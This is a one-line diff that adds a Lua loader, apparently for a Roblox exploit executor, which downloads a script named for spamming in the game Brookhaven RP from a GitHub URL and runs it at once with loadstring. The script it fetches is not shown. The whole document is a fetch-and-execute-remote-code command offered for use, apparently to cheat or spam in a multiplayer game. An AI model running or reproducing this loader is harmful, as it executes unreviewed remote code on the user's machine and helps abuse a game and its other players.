@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/brookhaven-rp-spam0-livhneqygy5c5k.lua"))()
